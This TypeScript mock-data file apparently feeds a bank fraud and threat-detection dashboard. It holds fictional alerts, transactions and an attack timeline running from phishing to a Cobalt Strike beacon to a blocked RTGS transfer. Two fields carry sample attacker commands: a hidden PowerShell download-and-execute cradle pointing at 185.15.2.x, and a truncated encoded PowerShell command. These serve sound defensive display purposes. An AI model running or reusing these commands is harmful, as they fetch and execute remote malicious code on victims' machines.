export const MOCK_ALERTS = [
  {
    id: "ALT-8492-BX",
    severity: "critical",
    status: "NEW",
    score: 94,
    timestamp: new Date(Date.now() - 1000 * 12).toISOString(),
    entity_id: "HDFC-MUM-SWIFT-GW-01",
    factors: ["T1078_VALID_ACCOUNTS", "COBALT_STRIKE_BEACON_DETECTED", "DATA_EXFILTRATION_TO_SANCTIONED_IP"],
    linked_transaction: {
      id: "RTGS-2026-XLM-88",
      amount: 45000000,
      sender: "ACCT-9901-CORP-TREASURY",
      receiver: "ACCT-8120-EXT-CAYMAN",
    },
    raw: {
      process: "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://185.15.2.x/a'))\"",
      ip: "185.15.2.45",
      user: "rajesh.kumar_admin"
    },
    correlation: {
      score: 96,
      signals: ["Impossible Travel", "Endpoint Malware", "High Value RTGS", "Device Drift", "Service Account Abuse"],
      telemetry_contribution: 71,
      transaction_contribution: 29
    },
    impact: {
      financial_exposure: "₹4.5Cr",
      affected_customers: "Corporate Treasury (HDFC)",
      affected_accounts: "ACCT-9901-CORP",
      compliance_risk: "High (SWIFT SLA Breach)",
      recovery_priority: "P0 (Critical)",
      risk_classification: "Financial Risk"
    },
    ai_insight: {
      reason: "Cobalt Strike beacon communicating with known sanctioned IP.",
      evidence: "Process powershell.exe -nop -w hidden executed on HDFC-MUM-SWIFT-GW-01.",
      impact: "High probability of imminent data exfiltration via RTGS transfer.",
      confidence: 98,
      recommended_action: "Isolate HDFC-MUM-SWIFT-GW-01 and Block IP 185.15.2.45 at Firewall."
    },
    quantum: {
      readiness_score: 68,
      assets_at_risk: 243,
      cbom_coverage: 82,
      migration_progress: "Phase 2 (In Progress)",
      critical_alerts: 2
    }
  },
  {
    id: "ALT-8491-AZ",
    severity: "high",
    status: "INVESTIGATING",
    score: 76,
    timestamp: new Date(Date.now() - 1000 * 300).toISOString(),
    entity_id: "USR-SVC-ATM-CTL",
    factors: ["MULTIPLE_FAILED_LOGINS", "OFF_HOURS_ACCESS", "IMPOSSIBLE_TRAVEL"],
    linked_transaction: null,
    raw: {},
    correlation: { score: 76, signals: ["Failed Logins", "Off Hours", "Impossible Travel"], telemetry_contribution: 100, transaction_contribution: 0 },
    impact: { financial_exposure: "Unknown", affected_customers: "Internal Service", affected_accounts: "N/A", compliance_risk: "Medium", recovery_priority: "P1 (High)", risk_classification: "Operational Risk" },
    ai_insight: { reason: "Anomalous login patterns from service account.", evidence: "15 failed logins in 2 seconds.", impact: "Potential credential stuffing.", confidence: 85, recommended_action: "Reset password and enforce MFA." },
    quantum: { readiness_score: 75, assets_at_risk: 120, cbom_coverage: 90, migration_progress: "Phase 3", critical_alerts: 0 }
  },
  {
    id: "ALT-8488-CX",
    severity: "medium",
    status: "NEW",
    score: 55,
    timestamp: new Date(Date.now() - 1000 * 1200).toISOString(),
    entity_id: "SBI-BLR-ATM-CTL-09",
    factors: ["AMOUNT_OUT_OF_PROFILE", "DEVICE_DRIFT"],
    linked_transaction: {
      id: "IMPS-992104-RBI",
      amount: 150000,
      sender: "ACCT-1022-RETAIL-HNI",
      receiver: "ACCT-0091-EXT-UNVERIFIED",
    },
    raw: {},
    correlation: { score: 55, signals: ["Device Drift", "Amount Out of Profile"], telemetry_contribution: 40, transaction_contribution: 60 },
    impact: { financial_exposure: "₹1.5L", affected_customers: "Retail HNI", affected_accounts: "ACCT-1022", compliance_risk: "Low", recovery_priority: "P2 (Medium)", risk_classification: "Financial Risk" },
    ai_insight: { reason: "Transfer amount exceeds normal profile from new device.", evidence: "IMPS transfer of ₹1.5L from unknown MAC address.", impact: "Potential account takeover.", confidence: 70, recommended_action: "Hold transaction and require step-up authentication." },
    quantum: { readiness_score: 95, assets_at_risk: 10, cbom_coverage: 100, migration_progress: "Complete", critical_alerts: 0 }
  }
];

export const MOCK_KPIS = {
  active_alerts: 14,
  mttd_avg_seconds: 1.2,
  blocked_amount: 125000000,
};

export const MOCK_TRANSACTIONS = [
  // Transactions linked to Fusion Dashboard Alerts
  { 
    id: "RTGS-2026-XLM-88", sender: "ACCT-9901-CORP-TREASURY", receiver: "ACCT-8120-EXT-CAYMAN", amount: 45000000, endpoint_id: "HDFC-MUM-SWIFT-GW-01", 
    risk_score: 94, correlated: true, decision: "BLOCK", timestamp: new Date(Date.now() - 1000 * 12).toISOString(),
    transaction_type: "RTGS", threat_category: "Data Exfiltration / Insider", assigned_analyst: "Sarah Jenkins", correlation_score: 98, ai_confidence: 96,
    mitre_techniques: ["T1078 Valid Accounts", "T1048 Exfiltration Over Alternative Protocol"], case_id: "CASE-9921", branch: "Mumbai Treasury", business_unit: "Corporate Banking"
  },
  { 
    id: "IMPS-992104-RBI", sender: "ACCT-1022-RETAIL-HNI", receiver: "ACCT-0091-EXT-UNVERIFIED", amount: 150000, endpoint_id: "SBI-BLR-ATM-CTL-09", 
    risk_score: 55, correlated: true, decision: "HOLD", timestamp: new Date(Date.now() - 1000 * 1200).toISOString(),
    transaction_type: "IMPS", threat_category: "Account Takeover", assigned_analyst: "Unassigned", correlation_score: 65, ai_confidence: 72,
    mitre_techniques: ["T1078 Valid Accounts"], case_id: null, branch: "Bangalore Main", business_unit: "Retail Banking"
  },
  
  // Other suspicious transactions connected to the same endpoints/accounts
  { 
    id: "SWIFT-9912-CX", sender: "ACCT-9901-CORP-TREASURY", receiver: "ACCT-7711-EXT-DUBAI", amount: 12500000, endpoint_id: "HDFC-MUM-SWIFT-GW-01", 
    risk_score: 88, correlated: true, decision: "BLOCK", timestamp: new Date(Date.now() - 1000 * 450).toISOString(),
    transaction_type: "SWIFT", threat_category: "Data Exfiltration / Insider", assigned_analyst: "Sarah Jenkins", correlation_score: 91, ai_confidence: 89,
    mitre_techniques: ["T1566 Phishing", "T1078 Valid Accounts"], case_id: "CASE-9921", branch: "Mumbai Treasury", business_unit: "Corporate Banking"
  },
  { 
    id: "NEFT-8812-XX", sender: "ACCT-9901-CORP-TREASURY", receiver: "ACCT-2290-EXT-SG", amount: 800000, endpoint_id: "HDFC-MUM-SWIFT-GW-01", 
    risk_score: 76, correlated: true, decision: "HOLD", timestamp: new Date(Date.now() - 1000 * 800).toISOString(),
    transaction_type: "NEFT", threat_category: "Lateral Movement", assigned_analyst: "Unassigned", correlation_score: 70, ai_confidence: 81,
    mitre_techniques: ["T1021 Remote Services"], case_id: null, branch: "Mumbai Treasury", business_unit: "Corporate Banking"
  },
  { 
    id: "IMPS-220199-ATM", sender: "ACCT-1022-RETAIL-HNI", receiver: "ACCT-4411-EXT-DOMESTIC", amount: 45000, endpoint_id: "USR-SVC-ATM-CTL", 
    risk_score: 65, correlated: true, decision: "HOLD", timestamp: new Date(Date.now() - 1000 * 300).toISOString(),
    transaction_type: "IMPS", threat_category: "Credential Stuffing", assigned_analyst: "Rajesh Kumar", correlation_score: 72, ai_confidence: 85,
    mitre_techniques: ["T1110 Brute Force"], case_id: "CASE-8810", branch: "Digital Channels", business_unit: "Retail Banking"
  },
  
  // Normal background traffic (Allow)
  { 
    id: "NEFT-1122-09", sender: "ACCT-5531-CORP-PAYROLL", receiver: "ACCT-9999-INT-EMPLOYEE", amount: 200000, endpoint_id: "CORP-MAC-CFO", 
    risk_score: 12, correlated: false, decision: "ALLOW", timestamp: new Date(Date.now() - 1000 * 3600).toISOString(),
    transaction_type: "NEFT", threat_category: "None", assigned_analyst: "System", correlation_score: 0, ai_confidence: 99,
    mitre_techniques: [], case_id: null, branch: "HQ", business_unit: "Internal Operations"
  },
  { 
    id: "UPI-4421-11", sender: "ACCT-1100-RETAIL-SAVINGS", receiver: "ACCT-4412-EXT-MERCHANT", amount: 80000, endpoint_id: "APP-SRV-02", 
    risk_score: 45, correlated: false, decision: "ALLOW", timestamp: new Date(Date.now() - 1000 * 7200).toISOString(),
    transaction_type: "UPI", threat_category: "None", assigned_analyst: "System", correlation_score: 0, ai_confidence: 90,
    mitre_techniques: [], case_id: null, branch: "Digital Channels", business_unit: "Retail Banking"
  },
  { 
    id: "RTGS-9910-44", sender: "ACCT-9901-CORP-TREASURY", receiver: "ACCT-8888-EXT-VENDOR", amount: 12000000, endpoint_id: "HDFC-MUM-SWIFT-GW-01", 
    risk_score: 18, correlated: false, decision: "ALLOW", timestamp: new Date(Date.now() - 1000 * 86400).toISOString(),
    transaction_type: "RTGS", threat_category: "None", assigned_analyst: "System", correlation_score: 10, ai_confidence: 95,
    mitre_techniques: [], case_id: null, branch: "Mumbai Treasury", business_unit: "Corporate Banking"
  },
  { 
    id: "UPI-8819-22", sender: "ACCT-3310-RETAIL-SAVINGS", receiver: "ACCT-8812-EXT-UTILITY", amount: 1500, endpoint_id: "APP-SRV-01", 
    risk_score: 5, correlated: false, decision: "ALLOW", timestamp: new Date(Date.now() - 1000 * 150).toISOString(),
    transaction_type: "UPI", threat_category: "None", assigned_analyst: "System", correlation_score: 0, ai_confidence: 99,
    mitre_techniques: [], case_id: null, branch: "Digital Channels", business_unit: "Retail Banking"
  },
  { 
    id: "IMPS-1190-33", sender: "ACCT-4421-CORP-OPEX", receiver: "ACCT-5510-EXT-SUPPLIER", amount: 450000, endpoint_id: "CORP-WIN-OPS", 
    risk_score: 22, correlated: false, decision: "ALLOW", timestamp: new Date(Date.now() - 1000 * 2400).toISOString(),
    transaction_type: "IMPS", threat_category: "None", assigned_analyst: "System", correlation_score: 0, ai_confidence: 94,
    mitre_techniques: [], case_id: null, branch: "HQ", business_unit: "Internal Operations"
  },
  { 
    id: "SWIFT-2291-ZZ", sender: "ACCT-9901-CORP-TREASURY", receiver: "ACCT-1122-EXT-LONDON", amount: 5500000, endpoint_id: "HDFC-MUM-SWIFT-GW-02", 
    risk_score: 25, correlated: false, decision: "ALLOW", timestamp: new Date(Date.now() - 1000 * 18000).toISOString(),
    transaction_type: "SWIFT", threat_category: "None", assigned_analyst: "System", correlation_score: 5, ai_confidence: 88,
    mitre_techniques: [], case_id: null, branch: "Mumbai Treasury", business_unit: "Corporate Banking"
  },
  { 
    id: "NEFT-7718-AA", sender: "ACCT-2210-RETAIL-CURRENT", receiver: "ACCT-4410-EXT-TAX", amount: 125000, endpoint_id: "APP-SRV-02", 
    risk_score: 8, correlated: false, decision: "ALLOW", timestamp: new Date(Date.now() - 1000 * 32000).toISOString(),
    transaction_type: "NEFT", threat_category: "None", assigned_analyst: "System", correlation_score: 0, ai_confidence: 97,
    mitre_techniques: [], case_id: null, branch: "Digital Channels", business_unit: "Retail Banking"
  },
  { 
    id: "UPI-5512-99", sender: "ACCT-1100-RETAIL-SAVINGS", receiver: "ACCT-9910-EXT-GROCERY", amount: 4500, endpoint_id: "APP-SRV-01", 
    risk_score: 2, correlated: false, decision: "ALLOW", timestamp: new Date(Date.now() - 1000 * 42000).toISOString(),
    transaction_type: "UPI", threat_category: "None", assigned_analyst: "System", correlation_score: 0, ai_confidence: 99,
    mitre_techniques: [], case_id: null, branch: "Digital Channels", business_unit: "Retail Banking"
  },
  
  // More blocked/hold traffic
  { 
    id: "RTGS-8812-MM", sender: "ACCT-5531-CORP-PAYROLL", receiver: "ACCT-0091-EXT-UNVERIFIED", amount: 8900000, endpoint_id: "CORP-MAC-HR", 
    risk_score: 91, correlated: true, decision: "BLOCK", timestamp: new Date(Date.now() - 1000 * 36000).toISOString(),
    transaction_type: "RTGS", threat_category: "Insider Threat", assigned_analyst: "Rajesh Kumar", correlation_score: 88, ai_confidence: 92,
    mitre_techniques: ["T1078 Valid Accounts", "T1048 Exfiltration"], case_id: "CASE-9905", branch: "HQ", business_unit: "Internal Operations"
  },
  { 
    id: "IMPS-4412-BB", sender: "ACCT-1022-RETAIL-HNI", receiver: "ACCT-7711-EXT-DUBAI", amount: 490000, endpoint_id: "SBI-BLR-ATM-CTL-09", 
    risk_score: 85, correlated: true, decision: "BLOCK", timestamp: new Date(Date.now() - 1000 * 41000).toISOString(),
    transaction_type: "IMPS", threat_category: "Account Takeover", assigned_analyst: "Unassigned", correlation_score: 82, ai_confidence: 86,
    mitre_techniques: ["T1078 Valid Accounts"], case_id: null, branch: "Bangalore Main", business_unit: "Retail Banking"
  },
  { 
    id: "UPI-9912-CC", sender: "ACCT-3310-RETAIL-SAVINGS", receiver: "ACCT-0091-EXT-UNVERIFIED", amount: 95000, endpoint_id: "APP-SRV-02", 
    risk_score: 68, correlated: false, decision: "HOLD", timestamp: new Date(Date.now() - 1000 * 45000).toISOString(),
    transaction_type: "UPI", threat_category: "Fraudulent Transfer", assigned_analyst: "Unassigned", correlation_score: 45, ai_confidence: 78,
    mitre_techniques: [], case_id: null, branch: "Digital Channels", business_unit: "Retail Banking"
  },
];

export interface TimelineEventEvidence {
  label: string;
  type: 'log' | 'pcap' | 'transaction' | 'intel';
  value: string;
  raw?: string;
}

export interface EnterpriseTimelineEvent {
  id: string;
  time: number;
  lane: 'Identity' | 'Endpoint' | 'Network' | 'Transaction' | 'AI Engine';
  type: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  entity: string;
  mitre?: string;
  description: string;
  aiCorrelated: boolean;
  evidence: TimelineEventEvidence[];
  linkedTo?: string[]; // IDs of events this logically triggers
}

export const MOCK_TIMELINE_EVENTS: EnterpriseTimelineEvent[] = [
  { 
    id: "evt-01",
    time: new Date(Date.now() - 1000 * 3600 * 24).getTime(), 
    lane: 'Identity', 
    type: 'Spearphishing Email Clicked', 
    severity: 'high',
    entity: 'sarah.jenkins@corp',
    mitre: 'T1566.002 Spearphishing Link',
    description: 'User clicked on a malicious link mimicking an internal HR portal update.',
    aiCorrelated: true,
    evidence: [{ label: 'Email Gateway Log', type: 'log', value: 'Proofpoint-Block-Failed', raw: '{"subject":"Urgent HR Update","sender":"hr@corp-portal-update.com","action":"clicked"}' }],
    linkedTo: ['evt-02']
  },
  { 
    id: "evt-02",
    time: new Date(Date.now() - 1000 * 3600 * 23.5).getTime(), 
    lane: 'Identity', 
    type: 'Credential Stuffing / MFA Fatigue', 
    severity: 'critical',
    entity: 'sarah.jenkins@corp',
    mitre: 'T1621 Multi-Factor Authentication Request Generation',
    description: 'Multiple MFA push notifications sent to user within a 10-minute window. User eventually approved.',
    aiCorrelated: true,
    evidence: [{ label: 'Okta Auth Log', type: 'log', value: 'MFA_APPROVED_AFTER_12_DENIES', raw: '{"user":"sarah.jenkins","mfa_type":"push","attempts":13,"result":"success"}' }],
    linkedTo: ['evt-03']
  },
  { 
    id: "evt-03",
    time: new Date(Date.now() - 1000 * 3600 * 23.4).getTime(), 
    lane: 'Network', 
    type: 'Anomalous VPN Login', 
    severity: 'high',
    entity: '185.15.2.45',
    mitre: 'T1133 External Remote Services',
    description: 'VPN connection established from an unknown ASN in Eastern Europe using Sarah Jenkins credentials.',
    aiCorrelated: true,
    evidence: [{ label: 'Cisco ASA Log', type: 'log', value: 'VPN_AUTH_SUCCESS', raw: '{"src_ip":"185.15.2.45","user":"sarah.jenkins","geo":"Eastern Europe","asn":"AS-MAL"}' }],
    linkedTo: ['evt-04']
  },
  { 
    id: "evt-04",
    time: new Date(Date.now() - 1000 * 3600 * 20).getTime(), 
    lane: 'Endpoint', 
    type: 'PowerShell Execution (Encoded)', 
    severity: 'critical',
    entity: 'EP-MUM-TRES-04',
    mitre: 'T1059.001 PowerShell',
    description: 'Execution of a Base64 encoded PowerShell script to download a Cobalt Strike beacon.',
    aiCorrelated: true,
    evidence: [{ label: 'CrowdStrike Alert', type: 'log', value: 'CS-PSH-01', raw: '{"process":"powershell.exe","cmdline":"powershell.exe -nop -w hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."}' }],
    linkedTo: ['evt-05']
  },
  { 
    id: "evt-05",
    time: new Date(Date.now() - 1000 * 3600 * 18).getTime(), 
    lane: 'Endpoint', 
    type: 'Cobalt Strike Beacon', 
    severity: 'critical',
    entity: 'EP-MUM-TRES-04',
    mitre: 'T1071.001 Web Protocols',
    description: 'Memory resident malware detected communicating with a known C2 server over HTTPS.',
    aiCorrelated: true,
    evidence: [{ label: 'Threat Intel', type: 'intel', value: 'C2 IP: 185.15.2.45 (Malicious)' }],
    linkedTo: ['evt-06']
  },
  { 
    id: "evt-06",
    time: new Date(Date.now() - 1000 * 3600 * 10).getTime(), 
    lane: 'Endpoint', 
    type: 'Lateral Movement (Pass The Hash)', 
    severity: 'critical',
    entity: 'HDFC-MUM-SWIFT-GW-01',
    mitre: 'T1550.002 Pass the Hash',
    description: 'NTLM hash used to authenticate laterally from the compromised endpoint to the SWIFT Gateway server.',
    aiCorrelated: true,
    evidence: [{ label: 'Windows Event 4624', type: 'log', value: 'Logon Type 3', raw: '{"EventID":4624,"LogonType":3,"TargetUserName":"admin_service","WorkstationName":"EP-MUM-TRES-04"}' }],
    linkedTo: ['evt-07']
  },
  { 
    id: "evt-07",
    time: new Date(Date.now() - 1000 * 3600 * 1).getTime(), 
    lane: 'Transaction', 
    type: 'High Value RTGS Initiated', 
    severity: 'high',
    entity: 'ACCT-9901-CORP',
    mitre: 'T1565.001 Stored Data Manipulation',
    description: 'A transaction of ₹4.5Cr was initiated to a newly added beneficiary.',
    aiCorrelated: true,
    evidence: [{ label: 'Core Banking', type: 'transaction', value: 'TXN-99124-PENDING', raw: '{"amount":45000000,"currency":"INR","type":"RTGS","beneficiary":"Global Corp Ltd","status":"PENDING"}' }],
    linkedTo: ['evt-08']
  },
  { 
    id: "evt-08",
    time: new Date(Date.now() - 1000 * 3600 * 0.9).getTime(), 
    lane: 'AI Engine', 
    type: 'Correlation Engine Triggered', 
    severity: 'info',
    entity: 'QuantumShield Core',
    description: 'AI successfully linked the identity compromise to the SWIFT server access and the RTGS transaction. Fraud blocked.',
    aiCorrelated: true,
    evidence: [{ label: 'AI Model output', type: 'log', value: 'Confidence: 98%', raw: '{"model":"qs_fin_fraud_v4","score":0.98,"factors":["vpn_anomaly","process_anomaly","txn_velocity"]}' }]
  }
];

